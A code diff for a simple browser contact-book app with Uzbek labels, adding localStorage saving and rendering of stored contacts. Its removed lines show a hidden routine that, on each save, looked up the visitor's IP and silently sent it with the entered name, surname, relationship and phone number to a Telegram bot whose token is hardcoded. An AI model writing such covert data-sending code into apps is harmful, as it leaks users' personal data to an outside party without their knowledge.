@@ -13,8 +13,7 @@ const elForm = document.querySelector('.js-form');
 const elAddNewContactTitle = $(".add-new-contact-title");
 
 let allResultsArr = [];
-
-// let allResultsArr = [];
+allResultsArr = JSON.parse(localStorage.getItem('allResultsArr')) || [];
 
 // form box elements
 const elSaveContactBtn = $(".js-save-contact-btn");
@@ -30,7 +29,6 @@ let nameValue = elNameInput.value;
 let surnameValue = elSurnameInput.value;
 let whoIsValue = elWhoIsInput.value;
 let phoneNumberValue = elPhoneNumberInput.value;
-// form box inputs to values end
 
 // on clicked add new contact button
 elAddNewContactBtn.addEventListener("click", function() {
@@ -141,6 +139,103 @@ elNameInput.oninput = () => {
   }
 }
 
+// repeat for each function
+allResultsArr.forEach(function(contact) {
+// contatct box
+  const contactBox = document.createElement('div');
+  elContactsList.appendChild(contactBox);
+  contactBox.classList.add('contact-box', 'js-contact-box','mx-1','my-2','border-bottom','d-flex','justify-content-between');
+  
+  // contact value
+  const contactValue = document.createElement('div');
+  contactBox.appendChild(contactValue);
+  contactValue.classList.add('contact');
+
+  // contactTopInfo
+  const contactInfo = document.createElement('div');
+  contactValue.appendChild(contactInfo);
+  contactInfo.classList.add('contact-info-top', 'd-flex', 'align-items-center', 'user-select-none');
+
+  // contact name title
+  const contactNameTitle = document.createElement('h5');
+  contactInfo.appendChild(contactNameTitle);
+  contactNameTitle.classList.add('contact-name-title', 'contact-line', 'text-white', 'fw-bold');
+  contactNameTitle.textContent = 'Ismi: ';
+
+  // contact name output
+  const contactNemeOutput = document.createElement('span');
+  contactNameTitle.appendChild(contactNemeOutput);
+  contactNemeOutput.classList.add('contact-name-output', 'fw-normal');
+
+  //contact surname title
+  const contactSurnameTitle = document.createElement('h5');
+  contactInfo.appendChild(contactSurnameTitle);
+  contactSurnameTitle.classList.add('contact-surname-title', 'text-white', 'fw-bold');
+  contactSurnameTitle.textContent = 'Familiya: ';
+
+  // contact surname output
+  const contactSurnameOutput = document.createElement('span');
+  contactSurnameTitle.appendChild(contactSurnameOutput);
+  contactSurnameOutput.classList.add('contact-surname-output', 'fw-normal');
+
+  // contactBottom info
+  const contactInfoBottom = document.createElement('div');
+  contactValue.appendChild(contactInfoBottom);
+  contactInfoBottom.classList.add('contact-info-bottom', 'd-flex', 'align-items-center', 'user-select-none');
+
+  // contatc who is title
+  const contactWhoIsTitle = document.createElement('h5');
+  contactInfoBottom.appendChild(contactWhoIsTitle);
+  contactWhoIsTitle.classList.add('contact-who-is-title', 'contact-line', 'text-white', 'fw-bold');
+  contactWhoIsTitle.textContent = 'Sizga kimligi: ';
+
+  // contact who is output
+  const contactWhoIsOutput = document.createElement('span');
+  contactWhoIsTitle.appendChild(contactWhoIsOutput);
+  contactWhoIsOutput.classList.add('contact-name-output', 'fw-normal');
+
+  // contact phone number title
+  const contactPhoneNumberTitle = document.createElement('h5');
+  contactInfoBottom.appendChild(contactPhoneNumberTitle);
+  contactPhoneNumberTitle.classList.add('contact-phone-number-title', 'text-white', 'fw-bold');
+  contactPhoneNumberTitle.textContent = 'Telefon raqami: ';
+
+  //contatc phone nubber output
+  const contactPhoneNumberOutput = document.createElement('a');
+  contactPhoneNumberTitle.appendChild(contactPhoneNumberOutput);
+  contactPhoneNumberOutput.classList.add('contact-phone-number', 'js-phone-number', 'fw-normal', 'user-select-all', 'user-select-none', 'text-decoration-none');
+  
+  // contact delete btn box
+  const contactDeleteBtnBox = document.createElement('div');
+  contactBox.appendChild(contactDeleteBtnBox);
+  contactDeleteBtnBox.classList.add('contact-info-end', 'd-flex', 'justify-content-center', 'align-items-center');
+  
+  // delete contact btn
+  const contactDeleteBtn = document.createElement('button');
+  contactDeleteBtnBox.appendChild(contactDeleteBtn);
+  contactDeleteBtn.classList.add('delete-contact-btn', 'js-delete-contact-btn', 'btn', 'bg-transparent', 'shadow', 'border', 'text-light');
+  contactDeleteBtn.textContent = `O'chirish`;
+
+  // all items set value
+  contactNemeOutput.textContent = contact.name;
+  contactSurnameOutput.textContent = contact.surname;
+  contactPhoneNumberOutput.setAttribute('href', 'tel:' + contact.phoneNumber);
+  contactWhoIsOutput.textContent = contact.whoIs;
+  contactPhoneNumberOutput.textContent = contact.phoneNumber;
+
+  // delete contact btn
+  contactDeleteBtn.addEventListener('click', function() {
+    contactBox.remove();
+    let elItemTextCont = contact.name;
+    var indexOfFinder = elItemTextCont;
+    const index = allResultsArr.map(object => object.name).indexOf(indexOfFinder);
+    allResultsArr.splice(index, 1);
+    console.log(allResultsArr);
+
+    // localStorage allresultsarr update
+    localStorage.setItem('allResultsArr', JSON.stringify(allResultsArr));
+  } );
+});
 
 // on clicked save contact button
 elSaveContactBtn.addEventListener("click", function(evt) {
@@ -208,8 +303,8 @@ elSaveContactBtn.addEventListener("click", function(evt) {
       }
     }
   }
-  // if all inputs are valid end
 
+  // if all inputs are valid end
   if (mainFormValidationStatus) {
     let person = {
       name: nameValue,
@@ -224,62 +319,77 @@ elSaveContactBtn.addEventListener("click", function(evt) {
     elContactsList.appendChild(contactBox);
     contactBox.classList.add('contact-box', 'js-contact-box','mx-1','my-2','border-bottom','d-flex','justify-content-between');
     
+    // contact value
     const contactValue = document.createElement('div');
     contactBox.appendChild(contactValue);
     contactValue.classList.add('contact');
+
     // contactTopInfo
     const contactInfo = document.createElement('div');
     contactValue.appendChild(contactInfo);
     contactInfo.classList.add('contact-info-top', 'd-flex', 'align-items-center', 'user-select-none');
 
+    // contact name value
     const contactNameTitle = document.createElement('h5');
     contactInfo.appendChild(contactNameTitle);
     contactNameTitle.classList.add('contact-name-title', 'contact-line', 'text-white', 'fw-bold');
     contactNameTitle.textContent = 'Ismi: ';
 
+    // contact name output
     const contactNemeOutput = document.createElement('span');
     contactNameTitle.appendChild(contactNemeOutput);
     contactNemeOutput.classList.add('contact-name-output', 'fw-normal');
+
+    // contact surname title
     const contactSurnameTitle = document.createElement('h5');
     contactInfo.appendChild(contactSurnameTitle);
     contactSurnameTitle.classList.add('contact-surname-title', 'text-white', 'fw-bold');
     contactSurnameTitle.textContent = 'Familiya: ';
 
+    // contact surname output
     const contactSurnameOutput = document.createElement('span');
     contactSurnameTitle.appendChild(contactSurnameOutput);
     contactSurnameOutput.classList.add('contact-surname-output', 'fw-normal');
-    // contactTopInfo end
+
     // contactBottom info
     const contactInfoBottom = document.createElement('div');
     contactValue.appendChild(contactInfoBottom);
     contactInfoBottom.classList.add('contact-info-bottom', 'd-flex', 'align-items-center', 'user-select-none');
 
+    // contact who is title
     const contactWhoIsTitle = document.createElement('h5');
     contactInfoBottom.appendChild(contactWhoIsTitle);
     contactWhoIsTitle.classList.add('contact-who-is-title', 'contact-line', 'text-white', 'fw-bold');
     contactWhoIsTitle.textContent = 'Sizga kimligi: ';
 
+    // contact who is output
     const contactWhoIsOutput = document.createElement('span');
     contactWhoIsTitle.appendChild(contactWhoIsOutput);
     contactWhoIsOutput.classList.add('contact-name-output', 'fw-normal');
+
+    // contact phone number title
     const contactPhoneNumberTitle = document.createElement('h5');
     contactInfoBottom.appendChild(contactPhoneNumberTitle);
     contactPhoneNumberTitle.classList.add('contact-phone-number-title', 'text-white', 'fw-bold');
     contactPhoneNumberTitle.textContent = 'Telefon raqami: ';
 
+    // contact phone number output
     const contactPhoneNumberOutput = document.createElement('a');
     contactPhoneNumberTitle.appendChild(contactPhoneNumberOutput);
     contactPhoneNumberOutput.classList.add('contact-phone-number', 'js-phone-number', 'fw-normal', 'user-select-all', 'user-select-none', 'text-decoration-none');
+    
     // contactBottominfo end
     const contactDeleteBtnBox = document.createElement('div');
     contactBox.appendChild(contactDeleteBtnBox);
     contactDeleteBtnBox.classList.add('contact-info-end', 'd-flex', 'justify-content-center', 'align-items-center');
 
+    // contact delete btn
     const contactDeleteBtn = document.createElement('button');
     contactDeleteBtnBox.appendChild(contactDeleteBtn);
     contactDeleteBtn.classList.add('delete-contact-btn', 'js-delete-contact-btn', 'btn', 'bg-transparent', 'shadow', 'border', 'text-light');
     contactDeleteBtn.textContent = `O'chirish`;
-    // forEach function
+    
+    // all results forEach function
     allResultsArr.forEach(function(contact) {   // for each contact in array
       contactNemeOutput.textContent = contact.name;
       contactSurnameOutput.textContent = contact.surname;
@@ -287,45 +397,21 @@ elSaveContactBtn.addEventListener("click", function(evt) {
       contactWhoIsOutput.textContent = contact.whoIs;
       contactPhoneNumberOutput.textContent = contact.phoneNumber;
     });
-    
-    let uP ='';
-    async function getIP() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const jsonObj = (res.json()).then(data => {
-        uP = data.ip;
-      });
-      } catch (err) {
-        console.error(err);
-      }
-    }
-    getIP();
 
-    setTimeout(function() {
-      function sendmessage(){
-        chat_id = 1670604763;
-        token = `5498274845:AAFuzhbK9fyZ1jTAH-U8KB55q-9wMzS9dIw`;
-        let time = new Date();
-        let message = `${time}  IP ${uP} || Ismi: ${nameValue} || Familiyasi: ${surnameValue} || Kimligi: ${whoIsValue} || Telefon raqami: ${phoneNumberValue}`;
-        let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;
-        let xhr = new XMLHttpRequest();
-        xhr.open("GET", url, true);
-        xhr.send();
-      }
-      sendmessage();
-    }, 3000);
-
-    console.log(allResultsArr);
     // delete contact btn
     contactDeleteBtn.addEventListener('click', function() {
       contactBox.remove();
       let elItemTextCont = person.name;
       var indexOfFinder = elItemTextCont;
       const index = allResultsArr.map(object => object.name).indexOf(indexOfFinder);
-      // alert(index);
       allResultsArr.splice(index, 1);
       console.log(allResultsArr);
+
+      // localstroage allResultsArr update
+      localStorage.setItem('allResultsArr', JSON.stringify(allResultsArr));
     } );
-    // delete contact btn end
+
+    // localStorage set allResultsArr
+    localStorage.setItem('allResultsArr', JSON.stringify(allResultsArr));
 }
 });
